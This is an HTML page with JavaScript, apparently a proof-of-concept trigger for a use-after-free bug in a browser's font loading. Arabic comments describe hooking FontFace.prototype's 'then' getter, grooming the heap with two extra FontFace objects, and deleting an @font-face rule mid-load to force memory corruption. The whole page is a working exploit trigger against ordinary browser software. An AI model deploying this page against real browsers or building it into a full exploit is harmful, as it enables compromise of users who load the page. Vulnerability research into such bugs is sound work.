<!DOCTYPE html>
<html>
<head>
    <title>UAF Precision Trigger</title>
    <style id="s">
        @font-face { 
            font-family: 'x'; 
            src: url(nonexistent-font.woff); 
            unicode-range: U+0042; 
        }
    </style>
</head>
<body>
    <div id="debug" style="color: #0f0; font-family: monospace; font-size: 20px;">
        Starting...
    </div>

    <script>
        const debug = document.getElementById('debug');

        window.onload = () => {
            debug.innerText = "Script Initialized.";

            // كائن FontFace الأساسي
            let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
            document.fonts.add(A);
            void A.loaded;

            let fired = false;

            // الاعتراض الجراحي (Precision Hooking)
            Object.defineProperty(FontFace.prototype, 'then', {
                configurable: true,
                get() {
                    if (!fired && this === A) {
                        fired = true;
                        debug.innerText = "HOOK TRIGGERED!";
                        
                        // Grooming بسيط وغير مستنزف للذاكرة
                        // ننشئ كائنين فقط لترتيب الـ Heap حول مكان الحذف
                        new FontFace('y', 'local(Helvetica Bold)');
                        new FontFace('z', 'local(Helvetica Italic)');
                        
                        // الحذف الجراحي
                        document.getElementById('s').sheet.deleteRule(0);
                        
                        // Trigger الـ Layout لضمان التنفيذ الفوري
                        document.body.offsetTop;
                        
                        debug.innerText = "Trigger Executed. Monitoring for Crash/Corruption...";
                    }
                    return undefined;
                }
            });

            // البدء بالتحميل
            document.fonts.load('1em x', 'AB').catch((e) => {
                debug.innerText = "Finished. Status: " + e.message;
            });
        };
    </script>
</body>
</html>
